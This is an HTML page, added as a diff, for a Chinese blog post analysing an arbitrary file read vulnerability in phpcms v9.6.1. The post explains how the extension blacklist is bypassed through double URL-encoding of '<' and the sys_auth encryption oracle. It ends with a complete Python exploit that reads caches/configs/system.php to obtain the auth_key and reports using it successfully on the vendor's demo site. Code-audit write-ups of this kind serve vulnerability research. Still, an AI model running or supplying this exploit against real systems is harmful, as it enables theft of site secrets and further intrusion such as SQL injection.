@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="web,php,代码审计," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="漏洞危害通过利用该漏洞可以读取配置文件，获取authkey，可以进行高危恶意操. 漏洞触发点\phpcms\modules\content\down.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445public function download() &amp;#123;	$a_k =">
+<meta name="keywords" content="web,php,代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpcmsv9.6.1任意文件读取漏洞">
+<meta property="og:url" content="http://yoursite.com/2017/09/23/phpcmsv9-6-1任意文件读取漏洞/index.html">
+<meta property="og:site_name" content="Answer">
+<meta property="og:description" content="漏洞危害通过利用该漏洞可以读取配置文件，获取authkey，可以进行高危恶意操. 漏洞触发点\phpcms\modules\content\down.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445public function download() &amp;#123;	$a_k =">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2017/09/23/phpcmsv9-6-1任意文件读取漏洞/E7AA0122-2E65-41B7-ABDC-710914DDE83D.png">
+<meta property="og:updated_time" content="2017-09-23T13:58:38.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phpcmsv9.6.1任意文件读取漏洞">
+<meta name="twitter:description" content="漏洞危害通过利用该漏洞可以读取配置文件，获取authkey，可以进行高危恶意操. 漏洞触发点\phpcms\modules\content\down.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445public function download() &amp;#123;	$a_k =">
+<meta name="twitter:image" content="http://yoursite.com/2017/09/23/phpcmsv9-6-1任意文件读取漏洞/E7AA0122-2E65-41B7-ABDC-710914DDE83D.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/09/23/phpcmsv9-6-1任意文件读取漏洞/"/>
+
+
+
+
+
+  <title>phpcmsv9.6.1任意文件读取漏洞 | Answer</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Answer</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">不想成为别人眼中的自己</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/23/phpcmsv9-6-1任意文件读取漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Answer">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Answer">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">phpcmsv9.6.1任意文件读取漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-23T21:48:13+08:00">
+                2017-09-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>通过利用该漏洞可以读取配置文件，获取authkey，可以进行高危恶意操.</p>
+<h2 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h2><p>\phpcms\modules\content\down.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">public function download() &#123;</div><div class="line">	$a_k = trim($_GET[&apos;a_k&apos;]);</div><div class="line">	$pc_auth_key = md5(pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;).$_SERVER[&apos;HTTP_USER_AGENT&apos;].&apos;down&apos;);</div><div class="line">	$a_k = sys_auth($a_k, &apos;DECODE&apos;, $pc_auth_key);／／解密由get方式得到的$a_k</div><div class="line">	if(empty($a_k)) showmessage(L(&apos;illegal_parameters&apos;));</div><div class="line">	unset($i,$m,$f,$t,$ip);</div><div class="line">	$a_k = safe_replace($a_k);</div><div class="line">	parse_str($a_k)；</div><div class="line">	if(isset($i)) $downid = intval($i);</div><div class="line">	if(!isset($m)) showmessage(L(&apos;illegal_parameters&apos;));</div><div class="line">	if(!isset($modelid)) showmessage(L(&apos;illegal_parameters&apos;));</div><div class="line">	if(empty($f)) showmessage(L(&apos;url_invalid&apos;));</div><div class="line">	if(!$i || $m&lt;0) showmessage(L(&apos;illegal_parameters&apos;));</div><div class="line">	if(!isset($t)) showmessage(L(&apos;illegal_parameters&apos;));</div><div class="line">	if(!isset($ip)) showmessage(L(&apos;illegal_parameters&apos;));</div><div class="line">	$starttime = intval($t);</div><div class="line">	if(preg_match(&apos;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&apos;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&apos;..&apos;)!==FALSE) showmessage(L(&apos;url_error&apos;));</div><div class="line">	$fileurl = trim($f);</div><div class="line">	if(!$downid || empty($fileurl) || !preg_match(&quot;/[0-9]&#123;10&#125;/&quot;, $starttime) || !preg_match(&quot;/[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;/&quot;, $ip) || $ip != ip()) showmessage(L(&apos;illegal_parameters&apos;));	</div><div class="line">	$endtime = SYS_TIME - $starttime;</div><div class="line">	if($endtime &gt; 3600) showmessage(L(&apos;url_invalid&apos;));</div><div class="line">	if($m) $fileurl = trim($s).trim($fileurl);</div><div class="line">	if(preg_match(&apos;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&apos;,$fileurl) ) showmessage(L(&apos;url_error&apos;));</div><div class="line">	//远程文件</div><div class="line">	if(strpos($fileurl, &apos;:/&apos;) &amp;&amp; (strpos($fileurl, pc_base::load_config(&apos;system&apos;,&apos;upload_url&apos;)) === false)) &#123; </div><div class="line">		header(&quot;Location: $fileurl&quot;);</div><div class="line">	&#125; else &#123;</div><div class="line">		if($d == 0) &#123;</div><div class="line">			header(&quot;Location: &quot;.$fileurl);</div><div class="line">		&#125; else &#123;</div><div class="line">			$fileurl = str_replace(array(pc_base::load_config(&apos;system&apos;,&apos;upload_url&apos;),&apos;/&apos;), array(pc_base::load_config(&apos;system&apos;,&apos;upload_path&apos;),DIRECTORY_SEPARATOR), $fileurl);</div><div class="line">			$filename = basename($fileurl);</div><div class="line">			//处理中文文件</div><div class="line">			if(preg_match(&quot;/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/&quot;, $fileurl)) &#123;</div><div class="line">				$filename = str_replace(array(&quot;%5C&quot;, &quot;%2F&quot;, &quot;%3A&quot;), array(&quot;\\&quot;, &quot;/&quot;, &quot;:&quot;), urlencode($fileurl));</div><div class="line">				$filename = urldecode(basename($filename));</div><div class="line">			&#125;</div><div class="line">			$ext = fileext($filename);</div><div class="line">			$filename = date(&apos;Ymd_his&apos;).random(3).&apos;.&apos;.$ext;</div><div class="line">			$fileurl = str_replace(array(&apos;&lt;&apos;,&apos;&gt;&apos;), &apos;&apos;,$fileurl);／／导致漏洞触发的点，这里&lt;&gt;和制为空导致了漏洞产生;</div><div class="line">			file_down($fileurl, $filename);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>此段代码的主要意思就是用get方式得到一个$a_k，然后经过sys_auth解密，再把解密后的a_k解析成php变量，然后把这些变量中的\$s和\$f拼接成\$fileurl文件路径，然后再调用file_down去读文件。</p>
+<hr>
+<p>不过在进入file_down函数的之前，有一段正则检查</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(preg_match(&apos;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&apos;,$fileurl) ) showmessage(L(&apos;url_error&apos;));</div></pre></td></tr></table></figure>
+<hr>
+<p>这个正则写的比较死，限制不能读取php等文件。</p>
+<p>不过在这个正则后面几行进入file_down之前，调用了一段神奇的替换函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$fileurl = str_replace(array(&apos;&lt;&apos;,&apos;&gt;&apos;), &apos;&apos;,$fileurl);／／导致漏洞触发的点，这里&lt;&gt;和制为空导致了漏洞产生;</div></pre></td></tr></table></figure>
+<hr>
+<p>这里把&lt;和&gt;替换为空，这样导致漏洞产生。如果我们的\$s是caches/configs/system.p，$f是h&lt;p 那么二者一拼接\$fileurl的值就是caches/configs/system.ph&lt;p，这个时候没有触发黑名单的检测，然后进入替换函数，&lt;被替换成空，那么\$fileurl 变成caches/configs/system.php，那么就能读任意的php文件了。我们可以读auth_key或者数据库文件等等，拿到auth_key可以用来sql注入等等，危害巨大</p>
+<hr>
+<p>但是在进行pare_str的时候之前会有有个安全过滤函数safe_replace，这个函数会把&lt;置为空，那我们怎么引入&lt;呢。这个时候，本次漏洞的又一个关键点来了，parse_str会自动进行URL解码，所以我只要把&lt;进行url进行编码就行了。</p>
+<hr>
+<p>那么这个a_k怎么来的呢，看这里用了sys_auth函数来解密，所以我们要找到sys_auth函数加密的地方，这样我们就能控制我们的输入了</p>
+<p>找到其中一处用到sys_auth函数加密的地方，这里的src最后先get传送给set_cooke，然后set_cookie里面再调用sys_auth来加密src，所以这里的src就是我们的控制点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">public function swfupload_json() &#123;</div><div class="line">		$arr[&apos;aid&apos;] = intval($_GET[&apos;aid&apos;]);</div><div class="line">		$arr[&apos;src&apos;] = safe_replace(trim($_GET[&apos;src&apos;]));</div><div class="line">		$arr[&apos;filename&apos;] = urlencode(safe_replace($_GET[&apos;filename&apos;]));</div><div class="line">		$json_str = json_encode($arr);</div><div class="line">		$att_arr_exist = param::get_cookie(&apos;att_json&apos;);</div><div class="line">		$att_arr_exist_tmp = explode(&apos;||&apos;, $att_arr_exist);</div><div class="line">		if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123;</div><div class="line">			return true;</div><div class="line">		&#125; else &#123;</div><div class="line">			$json_str = $att_arr_exist ? $att_arr_exist.&apos;||&apos;.$json_str : $json_str;</div><div class="line">			echo $json_str;</div><div class="line">			param::set_cookie(&apos;att_json&apos;,$json_str);</div><div class="line">			return true;</div></pre></td></tr></table></figure>
+<p>##利用代码</p>
+<figure class="highlight plain"><figcaption><span>-*- coding:utf-8 -*-</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">import requests </div><div class="line">import re</div><div class="line">import hashlib</div><div class="line">import math</div><div class="line">import time</div><div class="line">import base64</div><div class="line"></div><div class="line"></div><div class="line">def microtime(get_as_float = False) :</div><div class="line">    if get_as_float:</div><div class="line">        return time.time()</div><div class="line">    else:</div><div class="line">        return &apos;%.8f %d&apos; % math.modf(time.time())</div><div class="line"></div><div class="line">def get_authcode(string, key = &apos;&apos;):</div><div class="line">    ckey_length = 4</div><div class="line">    key = hashlib.md5(key).hexdigest()</div><div class="line">    keya = hashlib.md5(key[0:16]).hexdigest()</div><div class="line">    keyb = hashlib.md5(key[16:32]).hexdigest()</div><div class="line">    keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]</div><div class="line"></div><div class="line">    cryptkey = keya + hashlib.md5(keya+keyc).hexdigest()</div><div class="line"> </div><div class="line">    key_length = len(cryptkey)</div><div class="line">    string = &apos;0000000000&apos; + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string</div><div class="line">    string_length = len(string)</div><div class="line">    result = &apos;&apos;</div><div class="line">    box = range(0, 256)</div><div class="line">    rndkey = dict()</div><div class="line">    for i in range(0,256):</div><div class="line">        rndkey[i] = ord(cryptkey[i % key_length])</div><div class="line">    j=0</div><div class="line">    for i in range(0,256):</div><div class="line">        j = (j + box[i] + rndkey[i]) % 256</div><div class="line">        tmp = box[i]</div><div class="line">        box[i] = box[j]</div><div class="line">        box[j] = tmp</div><div class="line">    a=0</div><div class="line">    j=0</div><div class="line">    for i in range(0,string_length):</div><div class="line">        a = (a + 1) % 256</div><div class="line">        j = (j + box[a]) % 256</div><div class="line">        tmp = box[a]</div><div class="line">        box[a] = box[j]</div><div class="line">        box[j] = tmp</div><div class="line">        result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))</div><div class="line">    return keyc + base64.b64encode(result).replace(&apos;=&apos;, &apos;&apos;).replace(&apos;+&apos;, &apos;-&apos;).replace(&apos;/&apos;, &apos;_&apos;)</div><div class="line"></div><div class="line">def poc(url):</div><div class="line">    md5 = lambda k:hashlib.md5(k).hexdigest()</div><div class="line">    getauth = lambda c,k:get_authcode(get_authcode(c,md5(&apos;login&apos;+md5(k+&apos;8.8.8.8&apos;))),k)</div><div class="line">    headers = &#123;&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;,     </div><div class="line">        &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0&quot;,</div><div class="line">        &quot;X-Forwarded-For&quot;:&quot;8.8.8.8&quot;,</div><div class="line">        &#125;</div><div class="line">    s = requests.get(url=url+&apos;/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1&apos;,headers=headers)</div><div class="line">    cookie_pre = [key for key in s.cookies.keys() if &apos;siteid&apos; in key][0][:-7]</div><div class="line">    userid = s.cookies[cookie_pre+&apos;_siteid&apos;]</div><div class="line">    s = requests.post(url=url+&apos;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;filename=test.jpg&amp;src=%26i%3D3%26d%3D1%26t%3D9999999999%26catid%3D1%26ip%3D8.8.8.8%26m%3D3%26modelid%3D3%26s%3Dcaches%2fconfigs%2fsystem.p%26f%3Dh%25253Cp%26xxxx%3D&apos;,</div><div class="line">       data=&#123;&apos;userid_flash&apos;: userid&#125;,headers=headers)</div><div class="line">    att_json = s.cookies[cookie_pre+&apos;_att_json&apos;]</div><div class="line">    s = requests.get(url=url+&apos;/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=&apos;+att_json,headers=headers)</div><div class="line">    pattern = &apos;&lt;a.*?href=&quot;(.*?)&quot;.*?&gt;.*?&lt;/a&gt;&apos;</div><div class="line"></div><div class="line">    downlink = re.search(pattern, s.content).group(1)</div><div class="line">    s = requests.get(url+&apos;/index.php&apos;+downlink,headers=headers)</div><div class="line">    print s.content</div><div class="line">    </div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    url=raw_input(&apos;input url : &apos;)</div><div class="line">    poc(url)</div></pre></td></tr></table></figure>
+<h2 id="读取phpcms的demo站的auth-key文件成功"><a href="#读取phpcms的demo站的auth-key文件成功" class="headerlink" title="读取phpcms的demo站的auth_key文件成功"></a>读取phpcms的demo站的auth_key文件成功</h2><p><img src="/2017/09/23/phpcmsv9-6-1任意文件读取漏洞/E7AA0122-2E65-41B7-ABDC-710914DDE83D.png" alt=""><br>当然不止auth_key，还可以读数据库配置文件，等等之类的。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/05/26/某些环境下绕过php后缀黑名单上传webshell/" rel="next" title="某些环境下绕过php后缀黑名单上传webshell">
+                <i class="fa fa-chevron-left"></i> 某些环境下绕过php后缀黑名单上传webshell
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/09/23/phpcmsq前台注入分析/" rel="prev" title="phpcms_v9.6.0前台注入分析">
+                phpcms_v9.6.0前台注入分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          
+            <img class="site-author-image" itemprop="image"
+              src="/images/avatar.gif"
+              alt="Answer" />
+          
+            <p class="site-author-name" itemprop="name">Answer</p>
+            <p class="site-description motion-element" itemprop="description">我就是我</p>
+        </div>
+
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞危害"><span class="nav-number">1.</span> <span class="nav-text">漏洞危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞触发点"><span class="nav-number">2.</span> <span class="nav-text">漏洞触发点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读取phpcms的demo站的auth-key文件成功"><span class="nav-number">3.</span> <span class="nav-text">读取phpcms的demo站的auth_key文件成功</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Answer</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+  <span class="post-meta-divider">|</span>
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
